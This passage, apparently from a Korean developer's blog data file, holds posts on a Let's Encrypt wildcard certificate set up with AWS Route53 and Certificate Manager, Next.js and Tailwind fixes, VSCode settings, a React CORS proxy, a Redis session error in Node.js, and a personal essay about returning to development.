-\n(E)xpand/(C)ancel: e\nRenewing an existing certificate for *.test.com and test.com\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nPlease deploy a DNS TXT record under the name:\n\n_acme-challenge.test.com.\n\nwith the following value:\n\nYou_Input_This_message\n\nBefore continuing, verify the TXT record has been deployed. Depending on the DNS\nprovider, this may take some time, from a few seconds to multiple minutes. You can\ncheck if it has finished deploying with aid of online tools, such as the Google\nAdmin Toolbox: https://toolbox.googleapps.com/apps/dig/#TXT/_acme-challenge.test.com.\nLook for one or more bolded line(s) below the line ';ANSWER'. It should show the\nvalue(s) you've just added.\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nPress Enter to Continue\n\n```\n\n여기까지 작업 후 AWS의 Route53에 접근 후 **호스팅 영역**의 호스팅을 선택한다.  \n아래의 순서대로 작업을 진행하다.\n\n1. 레코드 생성을 한다.\n2. 레코드 이름에는 \\_acme-challenge.test.com. 에서 앞에 \\_acme-challenge 을 입력한다.\n3. 레코드 유형에는 TXT를 선택한다.\n4. 값에는 **with the following value:**에 있는 You_Input_This_message 값을 입력한다.\n\n![](/img01.png)\n\n이렇게 설정을 다 한 후에 아래 도메인 확인인가 제대로 되었는지 확인하는 버튼이 있다.\n\n![](/img02.png)\n\n그걸 누르고 반환된 응답이 정상이 뜰 경우  \n저 설치 콘솔로 와서 엔터를 누르면 아래와 같이 진행된다.\n\n```\nSuccessfully received certificate.\nCertificate is saved at: /etc/letsencrypt/live/test.com/fullchain.pem\nKey is saved at:         /etc/letsencrypt/live/test.com/privkey.pem\nThis certificate expires on 2022-12-15.\nThese files will be updated when the certificate renews.\n\nNEXT STEPS:\n- This certificate will not be renewed automatically. Autorenewal of --manual certificates requires the use of an authentication hook script (--manual-auth-hook) but one was not provided. To renew this certificate, repeat this same certbot command before the certificate's expiry date.\n\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nIf you like Certbot, please consider supporting our work by:\n * Donating to ISRG / Let's Encrypt:   https://letsencrypt.org/donate\n * Donating to EFF:                    https://eff.org/donate-le\n- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -\nubuntu$\n```\n\n여기까지 하면 인증서 발급은 끝이며, 나와 같이 AWS EC2 환경에서 적용하는 사람이라면 다음과 같은 작업을 추가해줘야 한다.\n\n<br>\n\n### AWS 작업\n\n먼저 콘솔에서는 다음과 같은 절차로 진행한다.\n\n참고로 pem파일들은 아래의 경로에서 확인이 가능하다.\n\n```\n1> $ sudo ls /etc/letsencrypt/live/\n2> $ sudo cat /etc/letsencrypt/live/your.domain/fullchain.pem\n```\n\n위 명령어 중 1번을 수행하면 등록한 도메인이 디렉토리 형태로 뜨는데,  \n내용을 확인하려면 2번 명령어를 수행한다.  \n해당 디렉토리의 조작 및 조회에 root 권한이 필요하여 **sudo**를 붙인다.\n\n이렇게 준비 후 아래 순서대로 작업해준다.\n\n<br>\n\n1. AWS 콘솔에서 Certificate Manager 이동\n\n![](/img03.png)\n\n<br>\n\n2. 외부에서 획득한 인증서 가져오기\n\n![](/img04.png)\n\n<br>\n\n3. 인증서 선택에서 각 항목에 해당 하는 값을 가져온다. (아까 생성한 pem 파일을 사용)\n   1. 인증서 본문 => cert.pem\n   2. 인증서 프라이빗 => privkey.pem\n   3. 인증서 체인 => fullchain.pem\n\n![](/img05.png)\n\n4. 마무리 하면 ec2에 접속해서 콘솔에서 아래와 같이 nginx를 재시작 해준다.\n\n> sudo service nginx restart\n\n<br>\n\n### 정리\n\nnginx에도 몇 가지 작업을 해줘야 하는데 이 부분은 따로 포스팅해서 올릴 예정이다.\n\n[참고링크](https://oasisfores.com/letsencrypt-wildcard-ssl-certificate/)\n\n```toc\n\n```\n"},{"excerpt":"어쩌다 보니... 부동산 공부, 투자 공부 등을 하다가 취미로 개발을 좀 다시 시작했었었다. 기존에 쓰던 블로그의 글을 본 사람은 얼마 안될거 같지만... 무튼 근간 정리하면서 블로그를 다시 정비하며 글을 남겨본다. 아참...\n기존의 hexo로 운영했던 블로그 글들은 조금씩 이전할 생각이다. 과거의 실패 지금으로부터 한 3년 4년 전이려나... 좋은 직장…","fields":{"slug":"/my_story/220919_new-blog-start/"},"frontmatter":{"date":"September 19, 2022","title":"개발 블로그 재정비 및 새로운 환경에서 다시 시작","description":null,"tags":["My Story"],"series":"My Story","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n# 어쩌다 보니...\n\n부동산 공부, 투자 공부 등을 하다가 취미로 개발을 좀 다시 시작했었었다.  \n기존에 쓰던 블로그의 글을 본 사람은 얼마 안될거 같지만...  \n무튼 근간 정리하면서 블로그를 다시 정비하며 글을 남겨본다.\n\n아참...\n기존의 hexo로 운영했던 블로그 글들은 조금씩 이전할 생각이다.\n\n## 과거의 실패\n\n지금으로부터 한 3년 4년 전이려나...  \n좋은 직장(?)에서 때려치고 나와서 자만하다가 대기업 이직에 실패하고...  \n스타트업도 이곳 저곳 다니며 경력을 쌓긴 했지만, 물경력 + 깊은 기술 쌓기 실패로 또 대기업 이직에 실패 후...\n\n개인적으로 좀 쉬면서 직업을 바꿀까 라는 생각을 많이 했었다.  \n어찌보면 그 당시는 패배자 마인드고 꿈이랄 것도 없었다.  \n당시만 해도 돈이라는게 목적인 바보같은 삶을 살고 있었으니 말이다.\n\n## 개발 말고 다른 분야로\n\n근데 투자라는 것에 관심이 생기고, 부동산 공부를 하며 임장 다니고 매물 공부하고...  \n그러다 코로나가 오고 <b>대 유동성 파티</b>에 몸을 실어서 투자에 눈을 뜨게 되었다.  \n뭐 덕분에 개발하면서 이직 준비하고 그런 힘든 삶을 살 때보다는 엄청 나아졌다.\n\n와인과 미술이라는 영역도 접해보고,  \n코인으로 성공한 지인과 슈퍼카를 타고 트랙도 가보고,  \n유튜브도 해보고, 편집자도 해보고, 사진찍으러 다녀도 보고,  \n점점 개발자의 삶을 내려놓고 이런 저런 분야에 시간을 투자했다.\n\n## 시점의 변환\n\n이렇게 개발을 내려놓고 다양한 것을 경험해보고  \n이것저것 해보다 보니 내가 세상을 바라보는 시점,  \n그리고 삶의 지향점들이 변하기 시작했다.\n\n전에는 개발을 정말 잘하는 최고의 개발자,  \n코드 아티스트가 되고 싶었지만...\n\n지금은 전혀...  \n개발 실력은 그냥 내가 필요로 하는,  \n내가 만들고 싶어하는 것을 구현화 할 정도만 되면 된다.\n\n## 돈이린게 목적 자체였을 때\n\n솔직히 이렇게 시점이 변한것은 돈이었다.  \n예전에 구질구질한 개발자의 삶을 살 때는  \n돈이 목적이 되어 이직할 때 대기업 밴드에 맞춰,  \n연봉 500 내지는 2000 정도 인상을 목표로 하며...\n\n소위 <b>네카라쿠베</b> 라는 곳을 목표 삼아,  \n왜 공부해야 하는지 모르는 알고리즘,  \n실무에서 안쓰는 면접 대비용 질문 공부 등...\n\n그리고 면접 결과 메일의 제목만 봐도  \n결과를 알 수 있는 허망함을 느끼며...  \n그렇게 좌절감과 허무함을 계속 느끼는 삶을 살았었다.\n\n## 이제는?\n\n지금은 다른 사람들과 마찬가지로,  \n돈은 그냥 수단이고, 생존의 척도가 되었고,  \n몇 가지 인생에서 이루고 싶은 꿈이 생겼다.\n\n이제 로드맵을 그리고 그것을 향해서 나아가는 중이다.  \n아이러니하게도 그렇게 개발자의 삻을 혐오했지만  \n꿈을 이루려면 개발을 해야 한다(?)\n\n내가 만들고 싶은 서비스, 그리고 플랫폼들이 있다.\n\n이제는 삶이 안정화 되었으니 개발을 해보면서  \n나만의 프로젝트를 진행해보는 중이다.\n\n## 그러면 개발 블로그를 다시 활성화 한 이유는?\n\n음...  \n사실 내가 개발했던 흔적과 기록을 남기기 위한 용도가 크다.  \n예전에는 배운것을 공유하고, 내가 했던 삽질을  \n다른 사람이 하지 않기를 바라는 느낌으로 했다면\n\n지금은 온전히 나를 위한 기록이다.  \n그리고 여기에 남기는 정보나 시행착오가 어떤 다른 이에게 도움이 된다면  \n그것도 그것 나름대로 나이스 하지 않을까?\n\n## 정말로 그게 끝?\n\n마지막으로 또 한가지...  \n홍보와 수입이다.\n\n난 블로그에 에드센스를 달아뒀었다.  \n이건 일종의 나의 보상 심리(?)다.\n\n내가 일종의 배운 지식이나 정보를 정리해서 올리면,  \n그것을 위해 투자한 시간을 보상받는 느낌이랄까?\n\n그리고 이곳에 내가 만든 서비스를 홍보하는  \n그런 공간으로 쓰고 싶다.\n\n어짜피 뒷광고도 아니고 내가 만든걸 내가 홍보하겠다는데  \n문제 될 것도 없지 않을까 싶다.\n\n뭐 더 나아가서 잘 되면 그 서비스의 기술 블로그로도\n활용할 수 있지 않을까 싶다.\n\n## 마무리\n\n이 블로그를 잘 유지해보고 싶다.  \n방문해주신 분들께, 그리고 이 글을 읽으신 분들께 감사함을 표하며...\n\n나의 과거와 같이 힘든 시간을 보내는 분이 있다면...  \n난 힘내라고 말씀드리고 싶다.\n\n\n```toc\n\n```\n"},{"excerpt":"Next.js에서 body에 height 값을... 이번에 Next.JS로 프로젝트를 진행하다가 footer를 하단에 고정시켜야 했다. 그런데 css를 적용했음에도 안되서 개발자 도구를 키고 화면 컴포넌트를 확인하던 도중 화면 사이즈가 전체 화면이 아닌것을 확인하였다. 그래서 형식을 적용하려 했다. 내가 쓰는 Tailwindcss에서  로 적용하려 했지만…","fields":{"slug":"/next-js/220302_nextjs-height-full/"},"frontmatter":{"date":"March 02, 2022","title":"Next.JS에서 height full (전체화면)  적용하기 (with tailwindcss)","description":null,"tags":["NextJs","TailWindCss"],"series":"NextJs","previewImage":"nextjs_logo.webp","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_nextjs.png)\n\n# Next.js에서 body에 height 값을...\n\n이번에 **Next.JS**로 프로젝트를 진행하다가 footer를 하단에 고정시켜야 했다.  \n그런데 css를 적용했음에도 안되서 개발자 도구를 키고 화면 컴포넌트를 확인하던 도중 화면 사이즈가 전체 화면이 아닌것을 확인하였다.  \n그래서\n\n```html\n<body style=\"height=100%\"></body>\n```\n\n형식을 적용하려 했다.  \n내가 쓰는 **Tailwindcss**에서 `h-full` 로 적용하려 했지만 body에 적용이 안되었다.\n\n방법을 찾다 포기하려 했는데 방법을 찾게 되어 공유한다.\n\n## 1. 공통 레이아웃 또는 **\\_app.tsx** 에서 global style 을 적용해준다.\n\n아래의 코드를 적용한다.\n\n```jsx\n...\n{/* Body  full height */}\n      <style global jsx>{`\n        html,\n        body,\n        body > div:first-child,\n        div#__next,\n        div#__next > div {\n          height: 100%;\n        }\n      `}</style>\n...\n```\n\n나는 **\\_app.tsx** 에 선언된 공통 레이아웃 코드에서 적용 처리를 해줬다.  \n이렇게 하면 전체 화면이 적용된다.\n\n```toc\n\n```\n"},{"excerpt":"VSCode에서 Tailwindcss를 사용하려 보니... 이번에 개발하는 내 서비스의 기술스택을 완전히 바꾸게 되었다. 그 중 프론트엔드 쪽을 React로 잡았다. 그런데 이것저것 찾아보니 next.js를 쓰는게 좋을거 같아서 일단 변경해봤다. 근데 여긴 뭐 Typescript인지 뭔지 해서 이걸 써야 하는거 같다는 생각이 들었다. (안쓰면 나중에 고생…","fields":{"slug":"/tools/220224_unknown-at-rule-tailwind/"},"frontmatter":{"date":"February 24, 2022","title":"VSCode에서 Tailwindcss 사용시 Unknown at rule @tailwind 뜨는 문제","description":null,"tags":["Tools","VSCode"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# VSCode에서 Tailwindcss를 사용하려 보니...\n\n이번에 개발하는 내 서비스의 기술스택을 완전히 바꾸게 되었다.  \n그 중 프론트엔드 쪽을 React로 잡았다.  \n그런데 이것저것 찾아보니 next.js를 쓰는게 좋을거 같아서 일단 변경해봤다.  \n근데 여긴 뭐 Typescript인지 뭔지 해서 이걸 써야 하는거 같다는 생각이 들었다. (안쓰면 나중에 고생할거 같은?)\n\n일단 이것저것 셋팅을 해뒀는데 몇 가지 거슬리는 부분이 생겼다.\n\n![](/img_01.png)\n\n그 css에서 **@tailwind** 를 선언한 부분이 이렇게 경고가 났다.  \n그냥 무시해도 되는데...  \n나의 성격상 이게 또 거슬렸다.\n\n그래서 찾아보니 두 가지 방법으로 해결 가능했다.\n\n## 1번. 아주 심플한데 좀 찜찜한 방법 (미봉책)\n\n말 그대로 간단하다.\n\n1. VSCode에서 setting 으로 들어간다.\n2. 검색창에서 **css.lint.unknownAtRules** 을 검색\n3. 값을 **ignore**로 변경한다.\n\n![](/img_02.png)\n\n이렇게 처리하면 된다.  \n근데 미봉책이자 찜찜한 방법이다.\n\n## 2번. 정석으로 처리(?)\n\n설정을 추가하여 처리하는 방법인데 다음과 같다.\n\n1. 다음의 경로에 파일을 하나 생성한다.\n   - 자신의 vscode 환경설정 파일이 담기는 곳에 생성한다.\n     - Mac의 기준으로 home/.vscode 이다.\n   2. 파일명은 원하는 걸로 만들어주는데 여기선 **custom_css_config.json** 이라 하겠다\n   3. 그래서 결국 만들어지는 경로 및 파일명은 **/home/.vscode/custom_css_config.json** 가 된다.\n2. 1에서 만든 파일에 다음과 같은 json 내용을 채운다.\n   ```json\n   {\n     \"atDirectives\": [\n       {\n         \"name\": \"@tailwind\",\n         \"description\": \"Use the @tailwind directive to insert Tailwind’s `base`, `components`, `utilities`, and `screens` styles into your CSS.\",\n         \"references\": [\n           {\n             \"name\": \"Tailwind’s “Functions & Directives” documentation\",\n             \"url\": \"https://tailwindcss.com/docs/functions-and-directives/#tailwind\"\n           }\n         ]\n       }\n     ]\n   }\n   ```\n3. VSCode에서 setting를 열고 json이라 검색해서 **settings.json** 수정(JSON: Schemas 부분) 을 선택해서 수정 값에 아래의 내용을 추가해준다.\n\n```json\n{\n  //기타 기존 설정들\n  ....\n  \"css.customData\": [\".vscode/custom_css_config.json\"],\n  ...\n}\n```\n\n4. 이렇게 처리하고 VSCode를 재시작 해준다.\n\n이렇게 하면 된다.  \n근데 이렇게 해도 안된다면 VSCode의 확장 프로그램을 누락해서 그렇다.  \n나는 **PostCSS Language Support** 이걸 안깔아서 안되었다.  \n검색이 안될경우 [링크](https://marketplace.visualstudio.com/items?itemName=csstools.postcss) 를 참고하자.\n\n<br>\n\n여기까지 하면 보통은 다 될거로 믿는다.  \n만약 안된다면...\n\nNext.js 환경설정을 하면서 뭔가 누락을 했거나 핵심 확장 프로그램을 설치하지 않은거다.  \n근데 보통 여기까지 하면 문제는 사라질듯 하다.\n"},{"excerpt":"VSCode에서 Import에서 모듈이... 다른 블로그나 유튜브 영상에서 보면 VSCode에서 Import 한 모듈이나 라이브러리의 설명이 잘 나오는데 나는 안나왔다. 그래서 소스코드를 보니 아래 사진처럼 떴다.  내가 WebSocket 의 라이브러리인 ws를 추가했더니 저렇게 떴다. ws 앞에 보면 ... 이 보인다. 맨트는.. 모듈 wd에 대한 선언…","fields":{"slug":"/tools/220215_vscode-not-found-any/"},"frontmatter":{"date":"February 15, 2022","title":"VSCode에서 모듈 import 시 \"선언 파일을 찾을 없습니다\" 라고 뜰 때... (암시적으로 any 형식...)","description":null,"tags":["Tools","VSCode"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# VSCode에서 Import에서 모듈이...\n\n다른 블로그나 유튜브 영상에서 보면 VSCode에서 **Import** 한 모듈이나 라이브러리의 설명이 잘 나오는데 나는 안나왔다.\n\n그래서 소스코드를 보니 아래 사진처럼 떴다.\n\n![](/img_01.png)\n\n내가 WebSocket 의 라이브러리인 ws를 추가했더니 저렇게 떴다.  \nws 앞에 보면 ... 이 보인다.  \n맨트는..\n\n> 모듈 wd에 대한 선언 파일을 찾을 수 없습니다  \n> 암시적으로 any 형식이 포함됩니다.\n\n그리고 ws 위에 마우스를 올리면..\n\n![](/img_02.png)\n\n이렇게 **any** 가 뜬다.\n\n처음엔 이걸 어떻게 찾아야 하나...  \n구글링 엄청 했다.  \n그리고 답을 찾았다.\n\n## 해결법\n\n너무 간단했다.  \n저기 나온 설명대로 하면 되는 거였다 -\\_-;;;  \n난 yarn을 쓰는데 아래의 명령어를 수행한다.\n\n> yarn add --dev @types/ws\n\nnpm도 앞에 구문만 바꾸면 된다.\n\n개발용 의존성에 @types/[lib name] 을 설치해주면 끝...  \n여기서 **@types**는 타입 선언만 포함하는 모듈이다.  \n이걸 설치함으로써 Type Definition이 정의되어 이 문제가 해결되는 것이다.\n\n이리 하면 아래와 같이 잘 나오게 된다.\n\n![](/img_03.png)\n\n이런 사소한 것이 계속 거슬렸는데 해결되어서 마음이 편안해졌다.\n\n```toc\n\n```\n"},{"excerpt":"최근 개발을 접고.... 주식도 하락장으로 접어들어 재미없어졌고... 넷플릭스도 맨날 보니까 이제 좀 질려졌다. 그래서 개발을 다시 한번 제대로 해볼까? 라는 무시무시한 생각을 해보게 되었다. 몇달 전 전에 같이 일했던 지인으로부터 프로젝트 합류 요청을 받고 진행했었지만... 그 프로젝트에서 해야 할 포지션도 애매했고.. 나중에 뭔가 잘 되었을 때 스타트…","fields":{"slug":"/til/220214_til/"},"frontmatter":{"date":"February 14, 2022","title":"22년 2월 14일 개발일지 (With TIL)","description":null,"tags":["TIL"],"series":"TIL","previewImage":"writing.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_til.png)\n\n# 최근 개발을 접고....\n\n주식도 하락장으로 접어들어 재미없어졌고...  \n넷플릭스도 맨날 보니까 이제 좀 질려졌다.\n\n그래서 **개발을 다시 한번 제대로 해볼까?** 라는 무시무시한 생각을 해보게 되었다.  \n몇달 전 전에 같이 일했던 지인으로부터 프로젝트 합류 요청을 받고 진행했었지만...\n\n그 프로젝트에서 해야 할 포지션도 애매했고..  \n나중에 뭔가 잘 되었을 때 스타트업 창립 맴버로 들어가기에도 좀 애매했다.  \n그리고 무엇보다 그 팀이 개발하거나 프로젝트를 진행하는 방식이 나랑 안맞았고,\n\n가장 중요한 건...  \n난 프로젝트를 할 때 진행상황, 무엇을 해야 하는지 목표 등이 좀 명확하게 보여야 하는 문서나 도표?  \n그런 지표가 있었어야 하는데 약간 중구난방 식이었다.  \n다들 직업군이 있어서 바쁜거라 이해는 하지만... 그렇게 진행하는 플젝은 나랑 맞지 않았다.\n\n그리고 내 개인적인 사유도 있고 해서 난 나왔다.\n\n그쪽에서 진행하는 프로젝트는 node.js와 react, react-native 등을 썼다.  \n물론 난 하나도 몰라서 조금씩 배우면서 진행했다.\n\n난 사실 이쪽을 아예 몰랐다.  \nOnly Spring, Java만 고집했으니까...  \n지금 생각해보면 참 편협적인 사고였다.\n\n무튼 이번에 [SML](https://github.com/elfinlas/SML) 을 일렉트론으로 개발하면서 JS쪽과 Node를 좀 더 해보고 싶어졌다.  \n일단 더 큰 이유는 내가 만들고 싶은 웹 서비스가 있는데 이건 Spring boot로 개발하기엔 좀 힘들었다.\n\n그래서 이번 기회를 통해 기술 스택을 완전 바꿔보기로 했다.  \n이번에 목표 삼은건..\n\n- Node.js\n- Express\n- React\n- Next.js\n- Tailwindcss\n- React-Native\n\n이렇게?  \n일단 요새 현대 메타 풀스택으로 넘어가기로 정했다.\n\n사실 취업도 생각해 봤는데...  \n지금은 아쉬운 것도 없고 내 재산이 일정 수준 이하(2.5 정도?) 떨어지면 그때 쯔음 생각해봐야겠다.  \n요새 사람을 안만나니까 그냥 작고 러프한 스타트업이나 공유 오피스에 들어가보고 싶어지긴 했었다.\n\n뭐 일단 지금 생각한 아이디어 2개랑 흑집사를 완성 시켜보고 다 꼬이면 와인쪽 창업 해보고...  \n와인 리셀러쪽 창업해보고 싶어서 이것저것 알아봤는데 내가 원하는 상권에 열고, 이것저것 다 합치면 4억인가?  \n그냥 열고 망하더라고 함 해볼까 싶었지만...  \n그렇다고 교육비로 모은 자산의 1/3을 내는건 좀 아닌거 같아서 일단 보류하기로...  \n그리고 이쪽 업계도 공부가 필요하고, 인플루언서 성향도 필요해서 일단....\n\n그냥 내가 생각한 아이디어를 구현하는데 집중해볼까 한다.  \n이번에 기술스택을 바꾸는데 도움이 많이 되었던 사이트는 [노마드코더](http://nomadcoders.co/) 이다.  \n여기서 일단 맛보기로 무료 강의를 들어봤는데 무료만 들어도 어느 정도 베이스 지식은 쉽게 깔수 있었다.\n\n나머진 내가 찾아보면서 구현하면 되서..  \n무튼 이번에 한번 3월 안으로 웹 서비스를 구현해 보는 것을 목표로 했다.\n\n그런데....  \n이 귀찮음은 언제쯤 해결할 수 있을까?\n"},{"excerpt":"React에서 Cors 문제가... 최근 내 개인 프로젝트를 위해서 React와 node, next.js, typescript, tailwindcss 가 필요했다. 개발을 한창 내려놨던 터라 다시 새로운 것을 하려니 귀찮아졌다. 하지만 기존의 jQuery로 진행한 프로젝트를 모바일용으로 개발하는 것과 서버 기능 분담 등은 불가능 했다. 그래서 노마드코더 …","fields":{"slug":"/react/220212_react-cors/"},"frontmatter":{"date":"February 12, 2022","title":"React에서 Cors 문제 해결하기 (With proxy)","description":null,"tags":["ReactJS","CORS"],"series":"ReactJS","previewImage":"react_logo.png","isPrivate":null},"rawMarkdownBody":"\n![thumbnail](../thumbnail_react.png)\n\n# React에서 Cors 문제가...\n\n최근 내 개인 프로젝트를 위해서 React와 node, next.js, typescript, tailwindcss 가 필요했다.  \n개발을 한창 내려놨던 터라 다시 새로운 것을 하려니 귀찮아졌다.\n\n하지만 기존의 jQuery로 진행한 프로젝트를 모바일용으로 개발하는 것과 서버 기능 분담 등은 불가능 했다.  \n그래서 [노마드코더](http://nomadcoders.co) 에서 강의를 들으며, 외국 성님들의 유튭 강의를 들으며 공부를 시작했다.\n\n강의는 다 들었고, 샘플 프로젝트로 한번 개발을 시작해봤다.  \n그런데 fetch를 사용해서 JSON을 가져오는 부분에서 **Cors** 문제가 발생했다.  \n에러 내용은 다음과 같았다.\n\n```\n[Error] Origin http://localhost:3000 is not allowed by Access-Control-Allow-Origin.\n[Error] Fetch API cannot load https://xxx.com due to access control checks.\n[Error] Failed to load resource: Origin http://localhost:3000 is not allowed by Access-Control-Allow-Origin. (common.do, line 0)\n[Error] Unhandled Promise Rejection: TypeError: Load failed\n\t(익명 함수) (bundle.js:202)\n\tasyncFunctionResume\n\t(익명 함수)\n\tpromiseReactionJobWithoutPromise\n\tpromiseReactionJob\n```\n\n저 위에 xxx.com은 내가 임의로 설정한 사이트다.\n(정보 조회 사이트 공개가 불가해서 임의로 설정했다.)\n\n이걸 해결하는 법은 총 2개가 있다.\n\n1. xxx.com 의 서버 사이드에서 처리해주기.\n2. React의 package에서 proxy 처리 해주기.\n\n1번 방법의 경우 나에겐 선택할 수 없는 옵션이었다.\n그래서 2번을 선택했다.\n\n처리 방법은 간단했다.\n\n<br>\n\n### 적용법\n\n1. 자신의 프로젝트의 **package.json**에 **proxy** 항목을 추가한다.\n\n```\n{\n  \"name\": \"my-app\",\n  \"version\": \"0.1.0\",\n  \"private\": true,\n  \"dependencies\": {\n    \"@testing-library/jest-dom\": \"^5.16.2\",\n  ....\n  },\n  \"proxy\":\"https://xxx.com\",\n}\n```\n\nproxy가 들어가는 자리는 아무데나 상관 없다. (상위 값에 가능 (dependencies 이런데는 불가))\n\n<br>\n\n2. 호출하는 부분에서 전체 url이 아닌 도메인을 제외한 형태로 호출한다.\n\n예를 들어 풀 도메인이 다음과 같다면 두 번째 줄 처럼 처리하는 이야기다.\n\n> https://www.xxx.com/test/data?no=10\n> /test/data?no=10\n\n그래서 호출하는 형태는 아래와 같이 될 것이다.\n\n```\n...\nconst getLottoData = async() => {\n    const json = await(await fetch(\"/test/data?no=10\")).json();\n...\n}\n```\n\n근데 급 궁금해지는 것은...만약 2개 이상의 cors 사이트를 처리해야 한다면 어떻게 해야 하나?  \n이 부분은 직접 처리해야 할 때 다시 다뤄볼 예정이다.\n\n```toc\n\n```\n"},{"excerpt":"VSCode에서 Emmet 이 동작하지 않는다. VSCode를 잘 쓰다가 어디서 에밋? (발음이 Emmet 맞나 모르겠다) 이거를 알게 되서 해보려 했는데 안되었다 =.= 이상하게 뭔가 항상 인터넷에서 도는건 내 개발환경에서 안된다. 개발을 하지 말라는 게시인가.... 무튼 나와 비슷한 상황의 사람들을 위해 남겨본다. VSCode에서 설정을 연다. (Ma…","fields":{"slug":"/tools/220209_vscode-emmet/"},"frontmatter":{"date":"February 09, 2022","title":"VSCode에서 에밋(Emmet)이 동작하지 않는 경우","description":null,"tags":["Tools","VSCode"],"series":"Tools","previewImage":"setting.png","isPrivate":null},"rawMarkdownBody":"\n# VSCode에서 Emmet 이 동작하지 않는다.\n\nVSCode를 잘 쓰다가 어디서 에밋? (발음이 Emmet 맞나 모르겠다) 이거를 알게 되서 해보려 했는데 안되었다 =.=  \n이상하게 뭔가 항상 인터넷에서 도는건 내 개발환경에서 안된다.\n\n개발을 하지 말라는 게시인가....  \n무튼 나와 비슷한 상황의 사람들을 위해 남겨본다.\n\n1. VSCode에서 설정을 연다. (Mac 기준 **Cmd + ,**)\n2. 거기서 왼쪽 메뉴에서 **확장(Extensions)** 안에서 **HTML**을 선택하여 **HTML › Format: Unformatted** 항목의 **settings.json에서 편집** 항목을 선택한다.\n3. 설정 항목이 열리는데 맨 마지막 쯔음 아래 항목을 추가해준다.\n\n```\n{\n  ....\n    \"emmet.triggerExpansionOnTab\": true,\n    \"files.associations\": {\"*html\": \"html\"}\n}\n```\n\n1. 다 되면 테스트 해본다.\n\n![](/img_01.png)\n\n위 사진처럼 html 파일 하나 만들고 **!** 입력 후 **tab**해보면 위와 같이 뜨면 제대로 동작하는 것이다.\n\n<br>\n\n---\n\n### 참고\n\n[참고 사이트](https://dev.to/pranavarora1895/emmet-not-working-in-vs-code-heres-how-you-can-fix-this-problem-1367)\n\n```toc\n\n```\n"},{"excerpt":"세션을 사용하려다가... Node.JS에서 세션을 사용하려 했고, 저장소로 레디스(Redis) 를 사용하기로 했다. 설정법은 다음 포스팅에서 다루기로 하고... 일단 내가 쓰려 했던 패키지는 아래와 같다. 이렇게 설정하고 redis 설정을 해줬다. 참고로 설정 파일을 외부로 빼고 app.use() 에서 넣어서 쓰는 방식으로 개발했다. 이 부분을 참고하면 …","fields":{"slug":"/node-js/220208_node-session-cache/"},"frontmatter":{"date":"February 08, 2022","title":"Node.Js에서 Redis 세션 사용시 UnhandledPromiseRejectionWarning The client is closed 문제 뜨는 경우","description":null,"tags":["NodeJS","Redis","Troubleshooting"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n# 세션을 사용하려다가...\n\nNode.JS에서 세션을 사용하려 했고, 저장소로 레디스(Redis) 를 사용하기로 했다.  \n설정법은 다음 포스팅에서 다루기로 하고...  \n일단 내가 쓰려 했던 패키지는 아래와 같다.\n\n```json\n\"redis\": \"^4.0.3\",\n\"express-session\": \"^1.17.2\",\n\"connect-redis\": \"^6.0.0\",\n```\n\n이렇게 설정하고 redis 설정을 해줬다.  \n참고로 설정 파일을 외부로 빼고 app.use() 에서 넣어서 쓰는 방식으로 개발했다.  \n이 부분을 참고하면 될 것 같다.  \n그리고 설정파일의 경우 전체 정보를 공개하기 어렵기에 공통적인 부분만 남긴다.\n\n```javascript\n/**\n * Redis 설정\n */\n\nimport connectRedis from \"connect-redis\"\nimport redis from \"redis\"\n\nexport function getSession(session) {\n  const RedisStore = connectRedis(session)\n  const redisClient = redis.createClient({\n    // url: \"redis://127.0.0.1:10\",\n    host: \"127.0.0.1\",\n    port: 10,\n    password: \"0000\",\n  })\n\n  redisClient.unref()\n  redisClient.on(\"error\", console.log)\n\n  const sessionInfo = {\n    resave: false,\n    saveUninitialized: false,\n    secret: \"sessionSecret\",\n    name: \"sessionId\",\n    cookie: {\n      httpOnly: true,\n      secure: true,\n    },\n    store: new RedisStore({ client: redisClient }),\n  }\n  return session(sessionInfo)\n}\n```\n\n위와 같이 설정된 상태에서 node.js를 실행할 경우 아래와 같은 에러가 발생했다.\n\n```text\n[app] [2022-01-27T15:49:44.924Z] Server running to http://localhost:11 in dev\n(node:45453) UnhandledPromiseRejectionWarning: Error: The client is closed\n....\n```\n\n이런 문제가 발생하는 원인은 버전 문제다.  \n바로 **connect-redis** 패키지 문제이다.\n\n[NPM 사이트](https://www.npmjs.com/package/connect-redis) 에서도 확인 가능하지만 일부 내용을 발췌하면 다음과 같다.\n\n```\nRedisStore(options)\nThe RedisStore requires an existing Redis client. Any clients compatible with the redis API will work. See client option for more details.\n\nOptions\nclient\nAn instance of redis or a redis compatible client.\n\nKnown compatible and tested clients:\n\nredis (v3, v4 with legacyMode: true)\n```\n\n요기서 보면 redis를 사용할 때 v4를 사용할 경우 legacyMode를 사용해서 쓰라 되어 있다.  \n난 redis 버전을 낮췄다.\n\n> \"redis\": \"v3\"\n\n무튼 해결법은...\n\n1.  redis 버전을 낮춘다.\n2.  legacyMode를 활성화 한다.\n\n이 두가지를 조취한 다음 실행하면 아주 잘 된다.\n\n별거 아닌걸로 시간을 좀 많이 쓰니 답이 안보인다....-\\_-;;\n"},{"excerpt":"최근에 Node.JS 쪽으로 개발을 진행해보고 있다. Spring boot만 쓰다가 새롭게 해보니까 신기한게 많았다. 그리고 jQuery만 쓰고 수준 낮은 형태의 JS 개발을 했었던 내 개발 방법이 싫어서 이번에 JS도 다시 제대로 배워보고 있다. 근데 Node에서 아주 답답한게 있었다.... 난 ES6 형식으로 개발하는데 모듈을 임포트할 때 아래와 같은…","fields":{"slug":"/node-js/220228_node-absolute-path/"},"frontmatter":{"date":"February 08, 2022","title":"Node.Js 에서 import의 절대경로(Absolute Path) 지옥 탈출기","description":null,"tags":["NodeJS"],"series":"NodeJS","previewImage":"nodejs_logo.png","isPrivate":null},"rawMarkdownBody":"\n최근에 Node.JS 쪽으로 개발을 진행해보고 있다.  \nSpring boot만 쓰다가 새롭게 